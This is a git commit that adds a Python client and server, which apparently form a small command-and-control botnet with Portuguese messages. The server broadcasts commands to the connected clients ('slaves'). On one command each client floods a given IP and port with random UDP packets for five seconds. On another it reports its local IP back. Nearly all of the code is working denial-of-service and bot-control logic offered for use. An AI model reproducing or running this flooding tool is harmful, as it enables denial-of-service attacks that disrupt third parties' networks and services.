5cff45aff18ffd4d6d7a68eb8645138ca44945a2
Jam Sávio <jamsaavio@gmail.com>
2019-02-19 23:01:18 -0300

    Add files via upload

---
+++ client.py
@@ -0,0 +1,39 @@
+﻿# -*- coding: utf-8 -*-
+import socket
+import random
+import time
+
+serverName = "localhost"
+serverPort = 11600
+clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+clientSocket.connect((serverName,serverPort))
+
+def funcoes():
+	while True:
+		data = clientSocket.recv(1024).decode()  # receive response
+		if(data == "<esganar slaves>"): break 
+		elif data.find("aperriar") != -1:
+			ip,port=data.split(":")
+			ip=ip[10:]
+			port=port.replace(">","")
+			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			bytes = random._urandom(1024) #random bytes
+			timeout = time.time() + 5 
+			sent = 0
+		
+			while time.time() < timeout:
+				if time.time() > timeout:
+					break
+				sock.sendto(bytes,(ip,int(port)))
+				sent = sent+1
+				print("Aperriando %s com %s pacotes na porta %s" %(ip,sent,port))
+			print("Aperriou... Escutando...")
+		elif data == "<espiar hosts up>":
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect(("8.8.8.8", 80))
+			clientSocket.send(s.getsockname()[0].encode(encoding='utf-8'))
+			s.close()
+		else: print('Servidor enviou: ' + data)
+print("Aguardando server mandar mensagem broadcast...")
+funcoes()
+#clientSocket.close()
---
+++ server.py
@@ -0,0 +1,41 @@
+﻿# -*- coding: utf-8 -*-
+from socket import *
+import _thread
+import random
+import time
+
+clients=[]
+serverPort = 11600
+serverSocket = socket(AF_INET,SOCK_STREAM)
+serverSocket.bind(('localhost',serverPort))
+serverSocket.listen(1)
+print("┌┐ ┌─┐┌┬┐┌┐┌┌─┐┌┬┐\n├┴┐│ │ │ │││├┤  │ \n└─┘└─┘ ┴ ┘└┘└─┘ ┴ ")
+	
+def task(connection, client):
+	clients.append((connection,client))
+	print("\nNova conexao em: ",client,"!")
+	print("Digite uma mensagem broadcast:")
+	
+def broadcast():
+	while True:
+		msg=str(input("Digite uma mensagem broadcast: "))
+		if(msg!=""):
+			for i in range(len(clients)):
+				try:
+					conn=clients[i][0]
+					conn.send(msg.encode())
+					
+					if msg=="<espiar hosts up>":
+						received = conn.recv(1024)
+						print (str(received).replace("b","").replace("'","")+"\n")
+				except:
+					pass
+	
+print ("O server esta pronto para enviar comandos!")
+print ("Aguardando conexões...\n")
+_thread.start_new_thread(broadcast, ())
+
+while True:
+		connection, addr = serverSocket.accept()
+		_thread.start_new_thread(task, (connection, addr))
+		time.sleep(5)
